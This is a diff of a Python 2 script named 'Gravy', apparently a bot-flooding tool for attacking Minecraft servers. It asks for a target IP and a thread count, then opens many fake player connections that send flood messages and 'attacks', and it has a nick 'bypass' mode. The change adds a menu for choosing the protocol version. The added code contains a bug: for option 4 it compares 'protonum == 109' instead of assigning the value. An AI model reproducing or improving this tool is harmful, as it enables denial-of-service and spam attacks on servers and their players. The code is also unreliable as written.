@@ -4,8 +4,31 @@ print '--==[ Gravy ]==--'
 print
 print '--==[ Developed By @Arm4x and @marcog ]==--'
 print
-print '[i] Loading Gravylib  - Minecraft v. 1.10'
-print '[i] Protocol Version: 210'
+print 'Minecraft version:'
+print '[1] 1.8 -> 1.8.9'
+print '[2] 1.9'
+print '[3] 1.9.1'
+print '[4] 1.9.2'
+print '[5] 1.9.3 -> 1.9.4'
+print '[6] 1.10'
+print
+proto = input('Select minecraft version: ')
+
+if proto == 1:
+    protonum = 47
+elif proto == 2:
+    protonum = 107
+elif proto == 3:
+    protonum = 108
+elif proto == 4:
+    protonum == 109
+elif proto == 5:
+    protonum = 110
+elif proto == 6:
+    protonum = 210
+else:
+    synckill('\n[!] Invalid option!')
+
 target = raw_input('Select ip: ')
 threads = input('Select thread: ')
 pCount = 2
@@ -152,7 +175,7 @@ elif nickMode == 'bypass':
     def eventHook():
         while True:
             x = time.time()
-            gravylib.CraftPlayer(masterNick, password='', proxy=None, server=(target['ip'], int(target['port'])), eventHook=event, debug=False)._connect()
+            gravylib.CraftPlayer(masterNick, password='', proxy='', server=(target['ip'], int(target['port'])), eventHook=event, debug=False)._connect()
             while time.time() - x <= 4:
                 time.sleep(1)
 
@@ -213,7 +236,7 @@ def ThreadEntry():
                     job = jobs.pop(0)
                     jobs.append(job)
             nickname, password = job
-            gravylib.CraftPlayer(nickname, password=password, proxy='', server=(target['ip'], int(target['port'])), attacks=actions, prependFlood=prependFlood, msg=staticFloodMessage, debug=False, printchat=False, count=pCount, callback=cbck)._connect()
+            gravylib.CraftPlayer(nickname, password=password, protonum=protonum ,proxy='', server=(target['ip'], int(target['port'])), attacks=actions, prependFlood=prependFlood, msg=staticFloodMessage, debug=False, printchat=False, count=pCount, callback=cbck)._connect()
         except:
             pass
         #break
